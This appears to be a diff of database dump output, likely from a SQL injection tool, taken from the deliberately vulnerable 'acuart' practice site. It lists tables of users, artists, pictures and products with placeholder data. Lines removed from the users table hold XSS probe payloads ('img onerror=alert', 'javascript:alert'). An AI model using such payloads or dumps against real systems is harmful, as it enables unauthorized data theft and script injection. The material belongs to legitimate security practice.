-| artist_id | adesc                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | aname   |
-+-----------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------+
-| 1         | <p>\nLorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\n    Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis\n    nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.\n    Cras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.\n    Praesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a\n    mauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad\n    litora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.\n    Mauris magna eros, semper a, tempor et, rutrum et, tortor.\n</p>\n<p>\nLorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\n    Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis\n    nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.\n    Cras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.\n    Praesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a\n    mauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad\n    litora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.\n    Mauris magna eros, semper a, tempor et, rutrum et, tortor.\n</p> | r4w8173 |
-| 2         | <p>\nLorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\nSed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis\nnulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.\nCras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.\nPraesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a\nmauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad\nlitora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.\nMauris magna eros, semper a, tempor et, rutrum et, tortor.\n</p>\n<p>\nLorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\nSed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis\nnulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.\nCras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.\nPraesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a\nmauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad\nlitora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.\nMauris magna eros, semper a, tempor et, rutrum et, tortor.\n</p>                                                         | Blad3   |
-| 3         | <p>\nLorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\nSed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis\nnulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.\nCras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.\nPraesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a\nmauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad\nlitora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.\nMauris magna eros, semper a, tempor et, rutrum et, tortor.\n</p>\n<p>\nLorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\nSed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis\nnulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.\nCras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.\nPraesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a\nmauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad\nlitora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.\nMauris magna eros, semper a, tempor et, rutrum et, tortor.\n</p>                                                         | lyzae   |
-+-----------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------+
-
-Database: acuart
-Table: guestbook
-[0 entries]
-+-------+--------+----------+
-| mesaj | sender | senttime |
-+-------+--------+----------+
-+-------+--------+----------+
-
 Database: acuart
 Table: categ
 [4 entries]
@@ -4628,11 +4530,64 @@ Table: categ
 Database: acuart
 Table: users
 [1 entry]
-+---------------------+----------------------------------+------+-------+---------+-------+--------------------------------------+---------------------------------+
-| cc                  | cart                             | pass | email | phone   | uname | name                                 | address                         |
-+---------------------+----------------------------------+------+-------+---------+-------+--------------------------------------+---------------------------------+
-| 1234-5678-2300-9000 | 9591bc10df58fe76ac3d51fbfb459215 | test | val   | <blank> | test  | <iMg sRc=0 oNeRrOr=alert(304090899)> | //jjavascript:alert(2029988977) |
-+---------------------+----------------------------------+------+-------+---------+-------+--------------------------------------+---------------------------------+
++---------------------+----------------------------------+------+-----------------+---------+-------+------------+-----------+
+| cc                  | cart                             | pass | email           | phone   | uname | name       | address   |
++---------------------+----------------------------------+------+-----------------+---------+-------+------------+-----------+
+| 1234-5678-2300-9000 | 1e51a937f67dbd3ce87a82ee224b264b | test | email@email.com | 2323345 | test  | John Smith | 21 street |
++---------------------+----------------------------------+------+-----------------+---------+-------+------------+-----------+
+
+Database: acuart
+Table: artists
+[3 entries]
++-----------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------+
+| artist_id | adesc                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | aname   |
++-----------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------+
+| 1         | <p>\nLorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\n    Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis\n    nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.\n    Cras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.\n    Praesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a\n    mauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad\n    litora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.\n    Mauris magna eros, semper a, tempor et, rutrum et, tortor.\n</p>\n<p>\nLorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\n    Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis\n    nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.\n    Cras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.\n    Praesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a\n    mauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad\n    litora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.\n    Mauris magna eros, semper a, tempor et, rutrum et, tortor.\n</p> | r4w8173 |
+| 2         | <p>\nLorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\nSed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis\nnulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.\nCras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.\nPraesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a\nmauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad\nlitora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.\nMauris magna eros, semper a, tempor et, rutrum et, tortor.\n</p>\n<p>\nLorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\nSed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis\nnulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.\nCras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.\nPraesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a\nmauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad\nlitora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.\nMauris magna eros, semper a, tempor et, rutrum et, tortor.\n</p>                                                         | Blad3   |
+| 3         | <p>\nLorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\nSed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis\nnulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.\nCras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.\nPraesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a\nmauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad\nlitora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.\nMauris magna eros, semper a, tempor et, rutrum et, tortor.\n</p>\n<p>\nLorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\nSed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis\nnulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.\nCras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.\nPraesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a\nmauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad\nlitora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.\nMauris magna eros, semper a, tempor et, rutrum et, tortor.\n</p>                                                         | lyzae   |
++-----------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------+
+
+Database: acuart
+Table: pictures
+[7 entries]
++------+--------+--------+------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------+--------------+-------------------------------------------------------------------------------------------------------------------------------+
+| a_id | cat_id | pic_id | img              | plong                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               | price | title        | pshort                                                                                                                        |
++------+--------+--------+------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------+--------------+-------------------------------------------------------------------------------------------------------------------------------+
+| 1    | 1      | 1      | ./pictures/1.jpg | <p>\nThis picture is an 53 cm x 12 cm masterpiece.\n</p>\n<p>\nThis text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information. \n</p>  | 500   | The shore    | Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\nSed aliquam sem ut arcu.                           |
+| 1    | 1      | 2      | ./pictures/2.jpg | <p>\nThis picture is an 53 cm x 12 cm masterpiece.\n</p>\n<p>\nThis text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information. \n</p>  | 800   | Mistery      | Donec molestie.\nSed aliquam sem ut arcu.                                                                                     |
+| 1    | 1      | 3      | ./pictures/3.jpg | <p>\nThis picture is an 53 cm x 12 cm masterpiece.\n</p>\n<p>\nThis text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information. \n</p>  | 986   | The universe | Lorem ipsum dolor sit amet. Donec molestie.\nSed aliquam sem ut arcu.                                                         |
+| 1    | 1      | 4      | ./pictures/4.jpg | <p>\nThis picture is an 53 cm x 12 cm masterpiece.\n</p>\n<p>\nThis text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information. \n</p>  | 1000  | Walking      | Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\nSed aliquam sem ut arcu. Phasellus sollicitudin.\n |
+| 1    | 1      | 5      | ./pictures/5.jpg | <p>\nThis picture is an 53 cm x 12 cm masterpiece.\n</p>\n<p>\nThis text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information. \n</p>  | 460   | Mean         | Lorem ipsum dolor sit amet, consectetuer adipiscing elit.                                                                     |
+| 1    | 2      | 6      | ./pictures/6.jpg | <p>\nThis picture is an 99 cm x 200 cm masterpiece.\n</p>\n<p>\nThis text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information. \n</p> | 10000 | Thing        | Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\nSed aliquam sem ut arcu. Phasellus sollicitudin.\n |
+| 2    | 1      | 7      | ./pictures/7.jpg | bla bla bla long                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    | 15000 | Trees        | bla bla bla                                                                                                                   |
++------+--------+--------+------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------+--------------+-------------------------------------------------------------------------------------------------------------------------------+
+
+Database: acuart
+Table: products
+[3 entries]
++----+-------+---------------------------------------------------+--------------------------------+--------------------------------------------+
+| id | price | name                                              | rewritename                    | description                                |
++----+-------+---------------------------------------------------+--------------------------------+--------------------------------------------+
+| 1  | 359   | Network Storage D-Link DNS-313 enclosure 1 x SATA | network-attached-storage-dlink | NET STORAGE ENCLOSURE SATA DNS-313 D-LINK  |
+| 2  | 10    | Web Camera A4Tech PK-335E                         | web-camera-a4tech              | Web Camera A4Tech PK-335E                  |
+| 3  | 812   | Laser Color Printer HP LaserJet M551dn, A4        | color-printer                  | Laser Color Printer HP LaserJet M551dn, A4 |
++----+-------+---------------------------------------------------+--------------------------------+--------------------------------------------+
+
+Database: acuart
+Table: carts
+[0 entries]
++---------+------+-------+
+| cart_id | item | price |
++---------+------+-------+
++---------+------+-------+
+
+Database: acuart
+Table: featured
+[0 entries]
++--------+--------------+
+| pic_id | feature_text |
++--------+--------------+
++--------+--------------+
 
 
 
